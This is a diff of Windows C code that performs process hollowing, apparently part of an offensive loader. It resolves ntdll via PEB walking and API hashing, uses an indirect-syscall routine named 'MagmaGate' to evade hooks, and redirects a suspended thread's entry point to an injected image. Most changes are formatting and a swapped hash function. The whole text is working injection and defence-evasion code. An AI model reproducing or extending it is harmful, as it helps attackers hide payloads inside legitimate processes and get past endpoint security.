@@ -8,8 +8,8 @@ BOOL CreateSuspendedProcess
 )
 {
 
-	BOOL State = TRUE;
-	STARTUPINFOA StartupInfo;
+	BOOL				State = TRUE;
+	STARTUPINFOA		StartupInfo;
 	PROCESS_INFORMATION ProcessInfo;
 
 	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
@@ -54,16 +54,16 @@ BOOL ReadTargetFile
 	if (!lpBuffer || !nNumberOfBytesToRead)
 		return FALSE;
 
-	HANDLE hFile = NULL;
-	BOOL State = TRUE;
-	DWORD NumberOfBytesToRead = NULL;
-	LPVOID lppBuffer = NULL;
-	NTSTATUS status = NULL;
+	HANDLE hFile						= NULL;
+	BOOL State							= TRUE;
+	DWORD NumberOfBytesToRead			= 0;
+	LPVOID lppBuffer					= NULL;
+	NTSTATUS status						= NULL;
 	FILE_STANDARD_INFORMATION fsi;
-	IO_STATUS_BLOCK iosb = { 0 };
-	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
-	SYSCALL_INFO info = { 0 };
-	INSTRUCTIONS_INFO syscallInfos[3] = { 0 };
+	IO_STATUS_BLOCK iosb				= { 0 };
+	PIMAGE_EXPORT_DIRECTORY pImgDir		= NULL;
+	SYSCALL_INFO info					= { 0 };
+	INSTRUCTIONS_INFO syscallInfos[3]	= { 0 };
 
 	HMODULE ntdll = WalkPeb();
 	if (!ntdll)
@@ -107,10 +107,8 @@ BOOL ReadTargetFile
 
 	for (size_t i = 0; i < FuncSize; i++)
 	{
-		DWORD apiHash = GetBaseHash(
-			Functions[i],
-			ntdll,
-			pImgDir
+		DWORD apiHash = sdbmrol16(
+			Functions[i]
 		);
 
 		MagmaGate(pImgDir, ntdll, apiHash, &info);
@@ -226,14 +224,16 @@ BOOL HollowExec
 	if (!hProcess || !pImgNt || !rBuffer)
 		return FALSE;
 
-	BOOL State = TRUE;
-	DWORD dwOldProt = NULL, dwDelta = NULL, RelocOffset = NULL;
-	DWORD dwProt = NULL;
-	SIZE_T lpNumOfBytesWritten = NULL;
-	NTSTATUS status = NULL;
+	BOOL					State = TRUE;
+	DWORD					dwOldProt = 0, 
+							dwDelta = 0, 
+							RelocOffset = 0,
+							dwProt = 0;
+	SIZE_T					lpNumOfBytesWritten = 0;
+	NTSTATUS				status = NULL;
 	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
-	SYSCALL_INFO info = { 0 };
-	INSTRUCTIONS_INFO syscallInfos[3] = { 0 };
+	SYSCALL_INFO			info = { 0 };
+	INSTRUCTIONS_INFO		syscallInfos[3] = { 0 };
 
 	HMODULE ntdll = WalkPeb();
 	if (!ntdll)
@@ -261,10 +261,8 @@ BOOL HollowExec
 
 	for (size_t i = 0; i < FuncSize; i++)
 	{
-		DWORD apiHash = GetBaseHash(
-			Functions[i],
-			ntdll,
-			pImgDir
+		DWORD apiHash = sdbmrol16(
+			Functions[i]
 		);
 
 		MagmaGate(pImgDir, ntdll, apiHash, &info);
@@ -386,15 +384,15 @@ BOOL GetThreadCtx
 	if (!hThread || !rBuffer)
 		return FALSE;
 
-	BOOL State = TRUE;
-	CONTEXT ThreadCtx;
-	NTSTATUS status = NULL;
+	BOOL					State				= TRUE;
+	CONTEXT					ThreadCtx;
+	NTSTATUS				status				= NULL;
+	ULONG					suspendedCount		= 0;
+	PIMAGE_EXPORT_DIRECTORY pImgDir				= NULL;
+	SYSCALL_INFO			info				= { 0 };
+	INSTRUCTIONS_INFO		syscallInfos[4]		= { 0 };
 	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
 	ThreadCtx.ContextFlags = CONTEXT_FULL;
-	ULONG suspendedCount = 0;
-	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
-	SYSCALL_INFO info = { 0 };
-	INSTRUCTIONS_INFO syscallInfos[4] = { 0 };
 
 	HMODULE ntdll = WalkPeb();
 	if (!ntdll)
@@ -423,10 +421,8 @@ BOOL GetThreadCtx
 
 	for (size_t i = 0; i < FuncSize; i++)
 	{
-		DWORD apiHash = GetBaseHash(
-			Functions[i],
-			ntdll,
-			pImgDir
+		DWORD apiHash = sdbmrol16(
+			Functions[i]
 		);
 
 		MagmaGate(pImgDir, ntdll, apiHash, &info);
@@ -450,23 +446,15 @@ BOOL GetThreadCtx
 	printf(
 		"_______________\n"
 		"| \n"
-		"| [RAX]: [0x%016llX]\n"
-		"| [RBX]: [0x%016llX]\n"
 		"| [RCX]: [0x%016llX]\n"
 		"| [RDX]: [0x%016llX]\n"
 		"| [RSP]: [0x%016llX]\n"
-		"| [RSI]: [0x%016llX]\n"
-		"| [RDI]: [0x%016llX]\n"
 		"| [RIP]: [0x%016llX]\n"
 		"| \n"
 		"_______________\n",
-		ThreadCtx.Rax,
-		ThreadCtx.Rbx,
 		ThreadCtx.Rcx,
 		ThreadCtx.Rdx,
 		ThreadCtx.Rsp,
-		ThreadCtx.Rsi,
-		ThreadCtx.Rdi,
 		ThreadCtx.Rip
 	);
 
@@ -482,13 +470,6 @@ BOOL GetThreadCtx
 	INFO("[RCX] --> [0x%p] Updating Count Instruction...", (PVOID)ThreadCtx.Rcx);
 
 	ThreadCtx.Rcx = (LPVOID)((PBYTE)rBuffer + pImgNt->OptionalHeader.AddressOfEntryPoint);
-
-	/*status = NtSetContextThread(hThread, &ThreadCtx);
-	if (!NT_SUCCESS(status))
-	{
-		NTERROR("NtSetContextThread");
-		State = FALSE; goto CLEANUP;
-	}*/
 
 	if (!SetThreadContext(hThread, &ThreadCtx))
 	{
